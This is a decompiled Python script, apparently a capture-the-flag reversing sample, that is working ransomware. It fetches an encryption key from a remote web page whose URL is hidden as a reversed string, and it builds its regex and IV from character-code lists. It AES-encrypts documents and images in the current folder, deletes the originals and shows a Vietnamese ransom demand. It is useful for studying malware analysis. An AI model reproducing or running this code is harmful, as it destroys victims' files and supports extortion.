# uncompyle6 version 3.5.0
# Python bytecode 3.8 (3413)
# Decompiled from: Python 3.7.2 (default, Dec 29 2018, 06:19:36) 
# [GCC 7.3.0]
# Embedded file name: tongtien.py
import requests, re
from hashlib import sha256, md5
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from os import remove, getcwd, listdir
import ctypes
list_extensions = [
 '.txt', '.png', '.pdf', '.bmp', '.jpg', '.docx', '.xlsx', '.rtf']

def encrypt(key, iv, plaintext):
    key = bytes.fromhex(key)
    iv = bytes.fromhex(iv)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct = cipher.encrypt(pad(plaintext, 16))
    return iv + ct


def readFile(cd):
    for file in listdir(cd):
        if file.endswith(tuple(list_extensions)):
            f = open(file, 'rb').read()
            c = encrypt(key, iv, f)
            f1 = open(file + '.kcsc', 'wb').write(c)
            remove(file)


def getContent(url):
    response = requests.get(url)
    if response.status_code == 200:
        return response.text
    else:
        return


string1 = 'lmth.su_tuoba/su_tuoba/egap/oi.buhtig.maet-csck//:sptth'[::-1]
string2 = getContent(string1)
l1 = [62, 60, 101, 109, 62, 60, 99, 111, 100, 101, 62, 38, 113, 117, 111, 116, 59, 40, 46, 42, 63, 41, 38, 113, 117, 111, 116, 59, 60, 47, 99, 111, 100, 101, 62, 60, 47, 101, 109, 62, 60, 47, 115, 116, 114, 111, 110, 103]
l2 = [75, 77, 65, 32, 67, 121, 98, 101, 114, 32, 83, 101, 99, 117, 114, 105, 116, 121, 32, 67, 108, 117, 98]
key = ''
if string2 is not None:
    pattern = ''.join((chr(x) for x in l1))
    match = re.search(pattern, string2)
    key = match.group(1)
iv = ''.join((chr(y) for y in l2))
key = sha256(key.encode('utf-8')).hexdigest()
iv = md5(iv.encode('utf-8')).hexdigest()
cd = getcwd()
readFile(cd)
MessageBox = ctypes.windll.user32.MessageBoxW
MessageBox(None, 'Thằng nào có tiền thì nạp vào chuyển cho tao, ít thì 5 quả trứng, nhiều thì 1 tên lửa, anh không thích nói nhiều, anh nói cho chúng mày nghe', 'rANSomwarE', 0)
